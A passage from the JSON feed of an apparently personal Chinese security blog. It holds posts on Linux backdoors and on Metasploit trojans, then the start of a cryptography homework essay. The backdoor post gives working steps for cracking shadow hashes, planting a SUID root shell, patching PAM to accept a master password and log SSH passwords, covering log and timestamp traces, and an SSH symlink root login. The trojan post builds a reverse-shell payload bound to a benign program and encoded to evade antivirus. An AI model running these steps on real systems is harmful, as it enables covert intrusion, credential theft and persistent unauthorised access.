用户），-g-G 设置新用户所在群组及附加群组为 root。如果禁止 root 远程登录，更改对应的参数就行。</li>\n<li>第二个命令：添加密码（linux 中新创建的用户是被锁定的，需使用 passwd 命令设置密码，才能投入使用）</li>\n</ul>\n<h3 id=\"\"><a class=\"anchor\" href=\"#\">#</a> </h3>\n<p>但是这种增加用户账号的方法，会很轻易地被管理员发现</p>\n<h2 id=\"破解用户密码\"><a class=\"anchor\" href=\"#破解用户密码\">#</a> 破解用户密码</h2>\n<p>如果我们获得了某些用户的密码，那下次自然就可以直接登录了。</p>\n<p>linux 在 passwd 中存储了用户的信息，但是 passwd 文件允许<strong>所有用户读取</strong>，所以若是用户密码也存放在 passwd 中，将导致用户密码<strong>泄露</strong>。<br />\n因此 Linux 将密码信息<strong>单独存放</strong>到 shadow 文件中。shadow <strong>只有 root 用户</strong>拥有读权限，其他用户<strong>没有任何权限</strong>，从而保证用户密码的安全性。</p>\n<p>但是，如果获得 shadow 文件 **（/etc/shadow）**，你会看到里面的密码是这样的：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441478/Typera/2023/04/ee471def5fbcc8ec8666e76bd4403e8d.png\" alt=\"image-20230426005115328\" /> 当然是密码的 hash 值，不会让你直接看到的密码的明文</p>\n<p>但是，对于那些薄弱的密码，我们可以通过 <strong>John the Ripper</strong> 弱口令扫描工具（Kali 自带）进行破解。使用方法如下</p>\n<ol>\n<li>使用 unshadow 命令组合 passwd 和 shadow，获得 test： <code>unshadow /etc/passwd /etc/shadow &gt; test</code></li>\n<li>字典破解：使用自带的字典（usr/share/john/password.lst）：命令 <code>john test</code> <br />\n 使用自己的字典：命令 <code>john --wordlist=字典路径 test</code></li>\n</ol>\n<h2 id=\"放置suid-shell\"><a class=\"anchor\" href=\"#放置suid-shell\">#</a> 放置 SUID Shell</h2>\n<p>前提：getshell，已获得服务器的 root 权限</p>\n<p>SUID Shell 是一种<strong>能以 shell 拥有者权限运行</strong>的 shell，<br />\n这个后门其实就是更改了，拥有者为 root 的 shell 的属性（rwsr-xr-x）</p>\n<h3 id=\"命令\"><a class=\"anchor\" href=\"#命令\">#</a> 命令</h3>\n<p>root 下执行命令：<br />\n <code>cp /bin/bash .shell</code> <br />\n <code>chmod u+s .shell</code> <br />\n 解释：</p>\n<ol>\n<li>复制 /bin/bash 为当前目录下名为 .shell 的文件，</li>\n<li>更改 .shell 文件权限，设置为 u+s 后，其他用户<strong>都享有文件拥有者的权限</strong>（而当前为 <strong>root</strong>，即享有 root 权限）</li>\n</ol>\n<p>下次如果从普通用户登录服务器，就能用命令： <code>/.shell</code>  ，运行这个 shell，从而获得 <strong>root</strong> 权限。<br />\n但是，bash2 针对 SUID Shell 做了一些<strong>护卫措施</strong>，所以如果使用上述命令运行 .shell ，只能当你在<strong>本地</strong>下（非远程连接）才能让 shell 的权限升为 root ，若是在远程运行，则还是原来的权限不变。</p>\n<p>对于这种情况，需要使用这个命令运行： <code>/.shell -p</code> ，这样在远程下也能获得 root 的 shell 了 &gt;</p>\n<h3 id=\"实现-2\"><a class=\"anchor\" href=\"#实现-2\">#</a> 实现</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441485/Typera/2023/04/7f3bd66ffe0223053f8eec312efe1e52.png\" alt=\"image-20230426005121969\" /><br />\nwhoami 为 root</p>\n<h2 id=\"pam后门\"><a class=\"anchor\" href=\"#pam后门\">#</a> PAM 后门</h2>\n<h3 id=\"pam简介\"><a class=\"anchor\" href=\"#pam简介\">#</a> PAM 简介：</h3>\n<p>在 Linux 中执行某些程序时，执行前要先对启动它的用户进行认证，比如我们经常使用的 <strong>su</strong> 命令。<br />\n但是，实际工作时，我们常常得用<strong>不同的认证机制</strong>去认证不同程序的账号口令，这就会导致一个主机上有多个<strong>不同的认证系统</strong>，这显然是不合理的。<br />\n所以就有了<strong> PAM 机制</strong>。<strong>PAM</strong> 可以说是一套<strong> API</strong>，使管理员可以随意地选择程序的认证方式。<br />\nPAM 使用目录 **/etc/pam.d/<strong> 下的配置文件，即对应着不同的认证方式。程序调用目录下相应的配置文件，从而调用本地的认证模块（</strong>/lib/security/**）。</p>\n<h3 id=\"后门思路\"><a class=\"anchor\" href=\"#后门思路\">#</a> 后门思路：</h3>\n<p>我们<strong>登录</strong>的时候，也是用 PAM 模块来验证我们的密码是否正确的。<br />\n所以，我们可以从源码中找到<strong> PAM</strong> 的传统密码验证模块（pam_unix.so），<strong>修改 PAM 的验证逻辑</strong>，达成不去跟 shadow 里的密码校验，而是<strong>直接返回验证正确</strong>的效果，<br />\n然后编译出<strong>包含后门的 so 文件</strong>，替换原模块。</p>\n<h3 id=\"实现-3\"><a class=\"anchor\" href=\"#实现-3\">#</a> 实现：</h3>\n<ol>\n<li>直接使用脚本：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpdHNhbmQvc2hlbGwvYmxvYi9tYXN0ZXIvcGFtLnNo\">https://github.com/litsand/shell/blob/master/pam.sh</span></li>\n<li>手动更改</li>\n</ol>\n<h4 id=\"下载pam源码\"><a class=\"anchor\" href=\"#下载pam源码\">#</a> 下载 PAM 源码</h4>\n<p>首先确认 PAM 版本：</p>\n<ul>\n<li>Debian： <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code></li>\n<li>Centos： <code>rpm -qa|grep pam</code></li>\n</ul>\n<p>以我的 kali 为例，使用 <code>dpkg -s libpam-modules | grep -i version | cut -d' ' -f2</code> ，得到输出：<strong>1.4.0-11</strong><br />\n 去 <span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5saW51eC1wYW0ub3JnL2xpYnJhcnkv\">http://www.linux-pam.org/library/</span> 或者 GitHub 发布稳定版的地址 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2xpbnV4LXBhbS9saW51eC1wYW0vcmVsZWFzZXMlRUYlQkMlOEMlRTQlQjglOEIlRTglQkQlQkQlRTUlODglQjAlRTglODclQUElRTUlQjclQjElRTclODklODglRTYlOUMlQUMlRTclOUElODQlRTYlQkElOTAlRTclQTAlODElRUYlQkMlOUE=\">https://github.com/linux-pam/linux-pam/releases，下载到自己版本的源码：</span><br />\n<strong>下载</strong>： <code> wget https://github.com/linux-pam/linux-pam/releases/download/v1.4.0/Linux-PAM-1.4.0.tar.xz</code> <br />\n<strong> 解压</strong>： <code>tar -xvf Linux-PAM-1.4.0.tar.xz</code></p>\n<h4 id=\"修改源码\"><a class=\"anchor\" href=\"#修改源码\">#</a> 修改源码</h4>\n<p><strong>效果 1：自定义密码添加：</strong></p>\n<p>修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />\n第 173 行下加入： <code>if (strcmp(p,&quot;密码&quot;)==0) &#123;return PAM_SUCCESS;&#125;</code></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441501/Typera/2023/04/34fdc632b2e79b17065c6ee808b2095f.png\" alt=\"image-20230426005137550\" /></p>\n<p>很简单的代码：当输入的 p 和我们设定的 &quot;密码&quot; 相同的时候，返回直接验证成功。</p>\n<p><strong>编译：</strong></p>\n<p>确保有安装<strong> gcc 编译器</strong>和<strong> flex 库</strong>，<br />\n<strong>编译</strong>命令如下：<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cd Linux-PAM-1.4.0</span><br><span class=\"line\">./configure --prefix=/user --exec-prefix=/usr --localstatedir=/var --sysconfdir=/etc --disable-selinux --with-libiconv-prefix=/usr</span><br><span class=\"line\">make</span><br></pre></td></tr></table></figure><br />\n 未防止修改的 so 不正确，先找到原文件<strong>备份</strong>一个：</p>\n<p>命令 <code>find / -name &quot;pam_unix.so&quot;</code>   （找原文件地址）<br />\n我<strong>原文件</strong>的地址在：<strong>/usr/lib/x86_64-linux-gnu/security/pam_unix.so</strong><br />\n 编译出的<strong>新文件</strong>在：<strong>root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so</strong><br />\n <code>cp /usr/lib/x86_64-linux-gnu/security/pam_unix.so /tmp/pam_unix.so.bak</code> （备份在 /tmp/pam_unix.so.bak）<br />\n <code>cp /root/Linux-PAM-1.4.0/modules/pam_unix/.libs/pam_unix.so /usr/lib/x86_64-linux-gnu/security/pam_unix.so</code> （复制新 so 文件，覆盖原文件）</p>\n<p><strong>尝试用设定的密码登录：</strong></p>\n<p>（注意登录的需要是已有账户） <code>ssh 已有账户名@192.168.158.128</code> <br />\n 用自定义的 <strong>hello</strong> 密码，登录 root 成功：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441509/Typera/2023/04/8fa2af1fefbe5dab45f472a0e29e89b9.png\" alt=\"image-20230426005144666\" /></p>\n<p><strong>不足 &amp; 优化：</strong></p>\n<ul>\n<li>若是管理员<strong>查看登录日志</strong>：<br />\n实时查看最后 10 条  <code>tail -f -n 10 /var/log/auth.log</code> （视具体情况不同，日志也有可能是 /var/log/secure）<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441513/Typera/2023/04/69c6d32a187e72672948a797b8239c8a.png\" alt=\"image-20230426005149260\" /><br />\n 第一条是从 ssh 输入<strong>正确密码</strong>登录的日志，第二条是输入<strong>自定义的密码</strong>登陆的日志，<br />\n可以看到，第二条会比第一条多出一行记录，<strong>报告验证失败</strong>，<br />\n这是因为，在我们添加语句的前一行，先使用了 <strong>_unix_verify_password</strong> 函数进行了验证：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441525/Typera/2023/04/36756d8cdaf5be17fc933eb923916d51.png\" alt=\"image-20230426005201757\" /><br />\n 既然如此，我们可以找到函数 _unix_verify_password 的<strong>位置</strong>，在它验证之前，插入之前的那行代码，这样就能够<strong>避免验证密码报错</strong>。<br />\n更改文件的路径为 Linux-PAM-1.4.0/modules/pam_unix/support.c，如下图：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441530/Typera/2023/04/206c7138eeede30e24a10e586daa7fcc.png\" alt=\"image-20230426005205935\" /><br />\n 重新编译覆盖之后，ssh 远程登录，查看日志：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441538/Typera/2023/04/0a3b87fb36dbc9ad01b198b4b7497f9a.png\" alt=\"image-20230426005213331\" /><br />\n 可以看到，第三条就和第一条一样了。<br />\n&lt;br&gt;</li>\n<li>若是管理员查看<strong>文件修改的时间</strong>：<br />\n可以用 touch -r 命令修改新文件的时间：<br />\n <code>touch pam_unix.so -r /tmp/pam_unix.so.bak</code> （改为备份文件的时间）<br />\n修改前后用 <code>stat pam_unix.so*</code>  命令查看结果如下所示：<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441542/Typera/2023/04/63ec0bad9935885af21524b174d934d7.png\" alt=\"image-20230426005217672\" /><br />\n（仅更改了两项，可能还是会被管理员察觉，但是通过 -t 可以设定档案的时间记录)</li>\n</ul>\n<p>&lt;br&gt;<br />\n<strong> 效果 2：记录通过 ssh 登录的用户密码：</strong></p>\n<p>同样修改解压目录下的 <code>/modules/pam_unix/pam_unix_auth.c</code>  文件：<br />\n在第 173 行下加入，如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441547/Typera/2023/04/e0996c17577375def40744fabaf69c5e.png\" alt=\"image-20230426005222756\" /><br />\n 每次有用户登录的时候，将用户名 name 和密码 p 保存在 /tmp/.record_pwd 文件中</p>\n<p>保存 -&gt; 编译 -&gt; 覆盖 -&gt; 从 ssh 用正常密码登录几次账号，提供记录的数据 -&gt; 查看保存的文件：<br />\n <code>cat /tmp/.record_pwd</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441550/Typera/2023/04/c09d43ce405bdb94fdbbc667420539ad.png\" alt=\"image-20230426005227686\" /></p>\n<h2 id=\"ssh软连接后门\"><a class=\"anchor\" href=\"#ssh软连接后门\">#</a> SSH 软连接后门</h2>\n<p><strong>前提</strong>：</p>\n<ul>\n<li>getshell，已获得服务器的 root 权限，</li>\n<li>ssh 配置中开启了 PAM 进行身份验证（验证 PAM 是否开启： <code>cat/etc/ssh/sshd_config|grep UsePAM</code> ）一般默认开启</li>\n<li>防火墙关闭，或者开放了使用的端口号</li>\n</ul>\n<h3 id=\"原理\"><a class=\"anchor\" href=\"#原理\">#</a> 原理：</h3>\n<ul>\n<li>\n<p><strong>软连接简介：</strong><br />\n软链接，就是一个指向另一个档案位置的，特殊的档案。<br />\n软连接以路径的形式存在。类似于 Windows 操作系统中的<strong>快捷方式</strong>。</p>\n</li>\n<li>\n<p>若 ssh 配置中<strong>开启了 PAM 身份验证机制</strong>，PAM 模块会搜寻相关设定文件（一般在 **/etc/pam.d/<strong>）。<br />\n而在</strong> /etc/pam.d/su<strong> 文件中启用了</strong> pam_rootok.so** 模块。<br />\n该模块可以使 root 用户直接通过身份认证，<strong>不需要</strong>输入密码。</p>\n</li>\n<li>\n<p>当我们指定的端口的软链接文件为 <strong>/ 路径 /su</strong> 的时候，若从该端口<strong>连接 ssh</strong>，<strong>PAM</strong> 就会去路径 <code>/etc/pam.d/</code>  下找到对应的配置文件，即 **/etc/pam.d/su**，<br />\n然后使用 <strong>su</strong> 中启用的<strong> pam_rootok.so</strong> 模块，实现无密登录。</p>\n</li>\n</ul>\n<h3 id=\"创建root账户\"><a class=\"anchor\" href=\"#创建root账户\">#</a> 创建 root 账户</h3>\n<p>创建 ssh 软链接： <code>ln -sf /usr/sbin/sshd /usr/local/su;/usr/local/su -oPort=端口号</code> （端口号确保可用）</p>\n<p>这条命令，先是使用 ln 强制 (-f) 创建，路径为 <code>/usr/sbin/sshd</code>  文件的软连接 (-s)，并保存为 <code>/usr/local/su</code>  文件（<strong>路径随意</strong>、<strong>文件名可变</strong>），然后把 su 文件（sshd）连到指定的端口</p>\n<p>其中，创建的软连接名字虽然可变，但是也<strong>不能随便命名</strong>。可用的名字可以通过命令： <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  查看：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441558/Typera/2023/04/fc163d487f4169876de475b8ddda580f.png\" alt=\"image-20230426005233857\" /></p>\n<h3 id=\"实现-4\"><a class=\"anchor\" href=\"#实现-4\">#</a> 实现：</h3>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441561/Typera/2023/04/ca4d722ad8a618c1764639e0467bfd32.png\" alt=\"image-20230426005237555\" /></p>\n<p>这时候就能从 2333 端口，用 root 身份登入了（ <code>ssh root@192.168.158.128 -p 2333</code> ）：<br />\n这里使用 cmd 演示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441566/Typera/2023/04/b10b4b1d4b022009231a95b178468b94.png\" alt=\"\" /></p>\n<h3 id=\"创建其它账户\"><a class=\"anchor\" href=\"#创建其它账户\">#</a> 创建其它账户</h3>\n<p>PAM 中事先是没有供其他用户免密登录的配置文件的，所以，要事先使用下面的命令，用 echo 把引号内的内容保存到 <code>/etc/pam.d/用户名</code> 的文件里面，让以你的用户名为文件名的配置文件使用<strong> pam_rootok.so</strong> 模块。<br />\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot; </span><br><span class=\"line\"> #%PAM-1.0</span><br><span class=\"line\"> auth       sufficient   pam_rootok.so</span><br><span class=\"line\"> auth       include      system-auth</span><br><span class=\"line\"> account    include      system-auth</span><br><span class=\"line\"> password   include      system-auth</span><br><span class=\"line\"> session    include      system-auth &quot; &gt;&gt; /etc/pam.d/已有的用户名</span><br></pre></td></tr></table></figure><br />\n 现在可以看到，在 <code>/etc/pam.d/</code>  文件夹下出现了一个，以你设定的用户名为名的配置文件（这里为<strong> kali</strong>）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441571/Typera/2023/04/2ac6a6a91723dcd035e8e9a5163dfc92.png\" alt=\"image-20230426005247027\" /></p>\n<p>现在再执行 <code>find /etc/pam.d|xargs grep &quot;pam_rootok&quot;</code>  命令查找，可以看到，可用的名字已经多了一个<strong> kali</strong> 了：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441578/Typera/2023/04/1083edad21219c631ebbe5a28ceaba4f.png\" alt=\"image-20230426005254226\" /><br />\n 现在再使用命令： <code>ln -sf /usr/sbin/sshd /usr/local/kali;/usr/local/kali -oPort=端口号</code> 创建软链接，就能达到普通用户免密登陆的效果</p>\n<p><strong>实现：</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441582/Typera/2023/04/4b19889af9d0e88eadf9e812f25d2cd0.png\" alt=\"image-20230426005258790\" /></p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682441588/Typera/2023/04/e00aa90c6fe6c5fda03c942cf6a9fd29.png\" alt=\"image-20230426005304178\" /></p>\n",
            "tags": [
                "Backdoor",
                "Linux",
                "Kali"
            ]
        },
        {
            "id": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/",
            "url": "https://www.sycamore.top/CyberSecurity/%E6%9C%A8%E9%A9%AC/Metasploit-%E6%9C%A8%E9%A9%AC%E7%BC%96%E8%AF%91%E5%88%A9%E7%94%A8/",
            "title": "Metasploit 木马编译利用",
            "date_published": "2022-04-02T15:29:09.000Z",
            "content_html": "<div class=\"note default\">\n<p><strong>Metasploit</strong> 是一个开源的，可用来<strong>发现</strong>、<strong>验证</strong>并<strong>利用</strong>漏洞的渗透测试平台。</p>\n<p>Kali 中默认安装了 <strong>Metasploit</strong> 框架。</p>\n</div>\n<h2 id=\"msfvenom-命令实现木马生成-捆绑以及免杀处理\"><a class=\"anchor\" href=\"#msfvenom-命令实现木马生成-捆绑以及免杀处理\">#</a> msfvenom 命令实现木马生成、捆绑以及免杀处理</h2>\n<p><strong>简介：</strong></p>\n<p><strong>msfvenom</strong> 是 <strong>Metasploit</strong> 中的一个命令。</p>\n<p><strong>msfvenom</strong> 命令结合了 msfpayload 和 msfencoder 的功能，能够<strong>生成木马</strong>，并实现木马编码<strong>免杀</strong>和避免坏字符、捆绑木马等。</p>\n<h3 id=\"msfvenom-命令用法\"><a class=\"anchor\" href=\"#msfvenom-命令用法\">#</a> msfvenom 命令用法</h3>\n<p>涉及到的<strong>选项</strong>有：</p>\n<p><strong>-l</strong>：列出指定<strong>模块</strong>（包括 payloads, encoders, nops, platforms, archs, encrypt, formats, all）的所有可用<strong>资源</strong>。其中 <strong>payloads</strong> 对应的就是<strong>木马</strong>。</p>\n<p><strong>-p</strong>：指定需要使用的 <strong>payload</strong> ，可以指定 ‘-’ 或者 stdin 来<strong>自定义</strong> payload。<br />\n如果不知道 payload 包括哪些选项，可以使用  <code>--list-options</code>  列出 payload 的标准选项。</p>\n<p><strong>-f</strong>：指定 payload 的<strong>输出格式</strong>，可以使用  <code>--list formats</code>  来列出可选的格式。</p>\n<p><strong>-o</strong>：指定输出的 payload 的<strong>保存路径</strong>，也可以采用<strong>重定向</strong>的方式来替代 - o 选项。</p>\n<p><strong>-x</strong>： 指定一个<strong>自定义</strong>的<strong>可执行文件</strong>作为模板。即，把木马<strong>捆绑</strong>到指定的可执行文件上。</p>\n<p><strong>-e</strong>：指定使用的<strong>编码器</strong>（）。</p>\n<p><strong>-i</strong>： 指定对 payload 编码的<strong>次数</strong></p>\n<h3 id=\"木马生成\"><a class=\"anchor\" href=\"#木马生成\">#</a> 木马生成</h3>\n<ol>\n<li>先使用  <code>msfvenom -l payloads</code>  命令，查看<strong>可用的木马</strong>。<br />\n因为可用的木马有<strong>很多</strong>，所以可以根据所需木马的特性、结合 <strong>grep</strong> 限定木马的种类 <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442146/Typera/2023/04/ebeb726eacc7fad3302b80554fb13af1.png\" alt=\"image-20230426010221520\" /><br />\n 以木马  <code>linux/x86/meterpreter/reverse_tcp</code> （反向连接) 作为样例，<br />\n&lt;br&gt;</li>\n<li>查看该木马<strong>需要设置的选项</strong>：<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp --list-options</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442254/Typera/2023/04/874f3751e4961c5140e9e30ca40f22e7.png\" alt=\"image-20230426010409894\" /></li>\n</ol>\n<p>&lt;br&gt;</p>\n<ol start=\"3\">\n<li>\n<p>查看可指定的<strong>输出格式</strong>：<br />\n <code>msfvenom --list formats</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442270/Typera/2023/04/38ea1bb4d485262080541e030e6fc0a3.png\" alt=\"image-20230426010426398\" /><br />\n&lt;br&gt;</p>\n</li>\n<li>\n<p>参考上面得到的信息，构造<strong>生成木马</strong>的命令：<br />\n <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -o /root/payload.elf</code> <img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442278/Typera/2023/04/09553b61c2c9d88fe78ede3ea742468a.png\" alt=\"image-20230426010433724\" /></p>\n</li>\n</ol>\n<p>其中，<strong>-p</strong> 选择生成的木马为：<strong>linux/x64/shell_bind_tcp</strong>；<br />\n<strong>RHOST</strong> 指定将要攻击的<strong>目标主机</strong>的<strong> IP</strong>；<br />\n<strong>LPORT</strong> 指定对应端口号（默认为 4444，故可以不写）；<br />\n<strong>-f</strong> 指定生成木马文件的文件<strong>类型</strong>为 <strong>elf</strong><br />\n<strong>-o</strong> 指定保存生成的木马文件的<strong>地址</strong>为：<strong>/root/payload.elf</strong></p>\n<h3 id=\"木马捆绑\"><a class=\"anchor\" href=\"#木马捆绑\">#</a> 木马捆绑</h3>\n<p>通常情况下，木马会和正常的文件<strong>捆绑</strong>在一起，方便木马进行<strong>感染</strong>和<strong>传播</strong>。</p>\n<p>所以，我们要事先准备好一个用于<strong>绑定</strong>的文件，这里选用的是  <code>/root/hello_world</code> （ <strong>gcc</strong> 编译的一个简单的 C 程）。</p>\n<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -f elf -x /root/hello_world -o /root/payload_bundle.elf</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442285/Typera/2023/04/c7bc72a382ae694be589d6a5cb25a3de.png\" alt=\"image-20230426010440843\" /></p>\n<p>其中，<strong>-x</strong> 指定<strong>绑定</strong>的可执行文件为  <code>/root/hello_world</code> ，其余项与生成木马的指令一致。</p>\n<h3 id=\"木马免杀\"><a class=\"anchor\" href=\"#木马免杀\">#</a> 木马免杀</h3>\n<p>在杀毒软件泛滥的今天，不对木马文件进行免杀处理很难通过<strong>杀软的检查</strong>，所以需要对木马进行<strong>免杀</strong>处理。</p>\n<p>查看可用的编码器： <code>msfvenom -l encoders</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442290/Typera/2023/04/d9aa39a90db02fe251a93aff3dd31cb7.png\" alt=\"image-20230426010444808\" /></p>\n<p>选用<strong>免杀</strong>效果较好的 <strong>x86/shikata_ga_nai</strong> 编译器进行编码。<br />\n命令： <code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.158.132 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f elf -x /root/hello_world -o /root/payload_Anti_Virus.elf</code> <br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442294/Typera/2023/04/9f32f881202e4a535bac4f5ce0f8c517.png\" alt=\"image-20230426010449517\" /></p>\n<p>其中，<strong>-e</strong> 指定编译器为 <strong>x86/shikata_ga_nai</strong>，<br />\n<strong>-i</strong> 指定编码的次数为 5 次。<br />\n编码 <strong>5</strong> 次的木马，基本可以<strong>躲避部分</strong>杀软的查杀，</p>\n<p>当然可以对木马进行<strong>更多次</strong>的编码，这样可以<strong>提高</strong>木马的<strong>免杀机率</strong>，但是需要注意：这也可能会导致木马<strong>不可使用</strong>。</p>\n<h2 id=\"msfconsole-木马利用\"><a class=\"anchor\" href=\"#msfconsole-木马利用\">#</a> msfconsole 木马利用</h2>\n<p>使用之前生成的木马文件： <strong>payload.elf</strong>。</p>\n<h3 id=\"攻击端\"><a class=\"anchor\" href=\"#攻击端\">#</a> 攻击端：</h3>\n<p>输入命令  <code>msfconsole</code>  打开 <strong>MSF 控制台</strong><br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442298/Typera/2023/04/2c2e815f13d049741cd9371ace771daa.png\" alt=\"image-20230426010454524\" /></p>\n<p>输入命令： <code>use exploit/multi/handler</code> ，选择 exploit 模块</p>\n<p>然后，可以输入命令  <code>show options</code>  查看<strong>设置的参数</strong>（查看还要设置哪些）<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1704010005/Typera/2023/12/4a6d04ee3788a771e9fe642e64fa8104.png\" alt=\"trojan-horse10\" /></p>\n<p>命令  <code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code>  ，设置 <strong>PAYLOAD</strong><br />\n 命令  <code>set LHOST 192.168.158.132</code> ，设置 local host 的<strong> IP</strong></p>\n<p>命令  <code>run</code>  开始<strong>监听</strong>对应的端口，等待<strong>目标服务器</strong>执行<strong>木马</strong>后，就能获得 <strong>shell</strong>。<br />\n如下图所示：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442304/Typera/2023/04/8b2780434593170f1b8173cf9fa13836.png\" alt=\"image-20230426010500036\" /></p>\n<h3 id=\"目标服务器\"><a class=\"anchor\" href=\"#目标服务器\">#</a> 目标服务器：</h3>\n<p>用各种方式将<strong>木马文件</strong>传到<strong>目标服务器</strong>上，</p>\n<p>命令  <code>chmod +x payload.elf</code>  更改文件执行权限</p>\n<p>执行 <strong>payload.elf</strong> 文件（<strong>顺序</strong>：要在攻击端开始监听之后执行）：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682442311/Typera/2023/04/80d816c18312f780f743c4b82696c43f.png\" alt=\"image-20230426010506608\" /></p>\n<p>整理一下：</p>\n<ul>\n<li>攻击端：</li>\n</ul>\n<ol>\n<li><code>msfconsole</code></li>\n<li><code>use exploit/multi/handler</code></li>\n<li><code>set PAYLOAD linux/x86/meterpreter/reverse_tcp</code> <br />\n4. <code> set LHOST 192.168.158.132</code></li>\n<li><code>run</code> ，开始监听</li>\n</ol>\n<ul>\n<li>目标服务器：</li>\n</ul>\n<ol>\n<li>下载木马文件</li>\n<li><code>chmod +x payload.elf</code></li>\n<li><code>./ payload.elf</code></li>\n</ol>\n",
            "tags": [
                "Linux",
                "Kali",
                "Trojan horse",
                "Metasploit"
            ]
        },
        {
            "id": "https://www.sycamore.top/Homework/%E6%95%B0%E5%AD%A6%E6%80%9D%E7%BB%B4%E5%9C%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/",
            "url": "https://www.sycamore.top/Homework/%E6%95%B0%E5%AD%A6%E6%80%9D%E7%BB%B4%E5%9C%A8%E5%AF%86%E7%A0%81%E5%AD%A6%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/",
            "title": "数学思维在密码学中的应用",
            "date_published": "2022-03-03T15:15:28.000Z",
            "content_html": "<div class=\"note info\">\n<p>作业 (o′┏▽┓｀o)</p>\n</div>\n<h1 id=\"数学思维在密码学中的应用\"><a class=\"anchor\" href=\"#数学思维在密码学中的应用\">#</a> 数学思维在密码学中的应用</h1>\n<p>在进行具体阐述之前，我认为有必要初步介绍一下密码学</p>\n<h2 id=\"密码学介绍\"><a class=\"anchor\" href=\"#密码学介绍\">#</a> 密码学介绍</h2>\n<p>我认为密码学要探讨的问题，就是如何<strong>更好地进行信息加密</strong>、防止信息泄露。<br />\n密码学有数千年的历史。最开始为了防止信息泄露，会采取诸如，将信息用特殊的化学墨水写在纸上加以隐藏的手段，<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682440953/Typera/2023/04/d03e7e1cc30ada4331e61a76e994adc3.png\" alt=\"image-20230426000837810\" /><br />\n 但是这样的保密措施非常容易破解，但凡知道这个方法，就能轻易地读取隐藏地信息。<br />\n所以就诞生了<strong>密码</strong> —— 一种通过<strong>密钥</strong>加密信息的手段</p>\n<h2 id=\"古典密码\"><a class=\"anchor\" href=\"#古典密码\">#</a> 古典密码</h2>\n<p>1976 年以前的密码都属于古典密码，<br />\n古典密码有很多种，基本地可以大致分为两种，<strong>换位密码</strong>和<strong>替换密码</strong>。<br />\n简单来说，换位密码就是把<strong>明文</strong>（需加密的信息）打乱顺序重新排列，而替换密码就是用一张<strong>密码表</strong>替换明文中的特定字符</p>\n<h3 id=\"凯撒密码\"><a class=\"anchor\" href=\"#凯撒密码\">#</a> 凯撒密码</h3>\n<p>以替换密码为例，最简单的替换密码就是<strong>移位密码</strong>。移位密码，顾名思义就是把 <em>某种字符表</em> 按顺序后移 n 位。这个 n 就是所谓的<strong>密钥</strong>，而后移之后生成的 <em>新的字符表</em> 就是之前所说的<strong>密码表</strong>。其中，若是使用以 26 个英文字母（以及 10 个阿拉伯数字）构成的字符表，那么这种密码也被称为<strong>凯撒加密</strong>。<br />\n<img 